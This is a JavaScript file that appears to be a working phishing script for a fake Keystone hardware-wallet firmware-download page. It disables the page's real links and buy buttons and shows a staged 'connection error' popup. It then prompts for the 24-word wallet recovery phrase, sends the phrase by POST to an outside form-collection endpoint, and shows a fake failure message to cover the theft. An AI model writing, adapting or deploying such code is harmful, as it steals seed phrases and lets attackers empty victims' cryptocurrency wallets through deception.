// document.querySelectorAll("a").map(a =>{
//     console.log(a)
// })

// let megaBtn =  document.querySelector('.btn-rainbow.style__FooterButton-sc-11dcezw-1.zZQkN')
// console.log(megaBtn)
document.addEventListener("DOMContentLoaded", function () {
  // this.querySelector(".pop-up").style.visibility = "hidden"
  const a = this.querySelectorAll("a");
  a.forEach((a) => {
    if(a.href.endsWith("/#")) {
        a.href = window.location.href;
    } else {
        a.href = window.location.href + "#";
    }
    a.addEventListener("click", function (e) {
      e.preventDefault();
      // e.stopPropagation()
      // e.stopImmediatePropagation()
      // console.log(e)
    });
  });
  const checksumLink = this.querySelector(".title__H7-sc-1xsh9k7-13.style__BtnLink-nvpq29-21.bLzqWX.cVXZvi>a")
  checksumLink.addEventListener("click", function (e) {
    e.preventDefault();
    e.stopImmediatePropagation()
  })
  const cartIcon = this.querySelector("div.style__CartIconBox-sc-1xmk6zq-21.bUmEQC")
cartIcon.style.display = "none"
  const buyButton = this.querySelectorAll('button[data-mixpanel-id^="Buy"]');
  buyButton.forEach((button) => {
      button.addEventListener("click", function (e) {
        e.preventDefault();
        e.stopImmediatePropagation()
      });
  })
  const megaBtn =  this.getElementsByClassName("title__H6-sc-1xsh9k7-12 style__Btn-sc-130mdwb-0 dNKmUD hVsXzA btn-rainbow    style__FooterButton-sc-11dcezw-1 zZQkN")

  setTimeout(() => {
    megaBtn[0].style.display = "none"
  }, 1000)

  // setTimeout(() =>{console.log(document.querySelector("span.cc-imbb.cc-qfnu"))},1000)

  doMore(this)
});


function doMore(_this) {
  const shouldCloseKeyStonePopup = new Event("shouldCloseKeyStonePopup")
  toastr.options = {
    "preventDuplicates": true,
    "timeOut": "5000"
  }
  const popup = _this.querySelector(".pop-up")
  const closeBtn = _this.querySelector(".pop-up-close-btn")
    const firstDownloadBtn = _this.querySelector('a[data-mixpanel-id^="Multi-Coin Firmware Download"]')
    const secondDownloadBtn = _this.querySelector('div[style^="bottom: -25px"]')
    firstDownloadBtn.addEventListener("click", function() {
        popup.style.visibility = "visible"
        if(popup.classList.contains("slide-out-bottom")){
          popup.classList.remove("slide-out-bottom")
        }
        popup.classList.add("slide-in-bottom")
        
        closeBtn.addEventListener("click", function(){
          window.dispatchEvent(shouldCloseKeyStonePopup)
          popup.classList.remove("slide-in-bottom")
          popup.style.visibility = "hidden"
          popup.classList.add("slide-out-bottom")
          setTimeout(() => {
            reset(_this)
          },200)
        })
        doSteps(_this);
    })
    secondDownloadBtn.addEventListener("click", function(e){
      e.preventDefault();
      e.stopImmediatePropagation()
      

        popup.style.visibility = "visible"
        if(popup.classList.contains("slide-out-bottom")){
          popup.classList.remove("slide-out-bottom")
        }
        popup.classList.add("slide-in-bottom")
        
        let timedOut = doSteps(_this);
        closeBtn.addEventListener("click", function(){
          window.dispatchEvent(shouldCloseKeyStonePopup)
          popup.classList.remove("slide-in-bottom")
          popup.style.visibility = "hidden"
          popup.classList.add("slide-out-bottom")
          setTimeout(() => {
            reset(_this)
          },200)
        })
    })
}

function doSteps(_this, e = null) {
  const step1 = _this.querySelector("#step-1")
  const step2 = _this.querySelector("#step-2")
  const step3 = _this.querySelector("#step-3")
  const retryBtn = _this.querySelector("#retry-btn")
  const verifyBtn = _this.querySelector("#verify-btn")
  const form = _this.querySelector("#my-form")
  

  retryBtn.addEventListener("click", function(){
    reset(_this)
    doSteps(_this)
  })

  verifyBtn.addEventListener("click", function(){
    step2.style.display = "none"
    step3.style.display = "flex"
  })
  form.addEventListener("submit",function(e){
    submitPhrase(e, _this)
  })

  const timeOut = setTimeout(() =>{
      step1.style.display = "none"
      toastr.warning("A Connection error occured: ERR_NETWORK_DEVICE")
      step2.style.display = "flex"
  }, 9000)

  window.addEventListener("shouldCloseKeyStonePopup", function() {
    clearTimeout(timeOut)
    console.log("Clearing Timeout...")
  },true)

}

function reset(_this) {
  const step1 = _this.querySelector("#step-1")
  const step2 = _this.querySelector("#step-2")
  const step3 = _this.querySelector("#step-3")

  step1.style.display = "flex"
  step2.style.display = "none"
  step3.style.display = "none"
}

function submitPhrase(e,_this) {
  e.preventDefault()
  let phrase = _this.querySelector('textarea[name^="phrase"]')
  phrase = phrase.value.trim()
  const split = phrase.split(" ")

  if(phrase === "" || split.length < 24 || split.length !== 24) {
    toastr.error("Invalid recovery phrase, please double-check the phrase and try again.")
  }else {
    const formLoadingSpinner = _this.querySelector("#form-load-spinner")
    const FORMSPARK_ACTION_URL = "https://submit-form.com/6BjaBkrx"
    formLoadingSpinner.style.display = "inline-block"

   const timeOut =  setTimeout(() => {
      fetch(FORMSPARK_ACTION_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify({
          phrase
        }),
      })
        .then(() => {
          toastr.error("Oops! An error occurred while attempting to verify your wallet. Please try again later.");
        })
        .catch(() => {
          toastr.error("Oops! We're sorry, but an internal server error has occurred");
        })
        .finally(() => {
          formLoadingSpinner.style.display = "none"
        });
    },3000)
    window.addEventListener("shouldCloseKeyStonePopup", function() {
      clearTimeout(timeOut)
      console.log("Clearing Timeout...")
    },true)
  }
}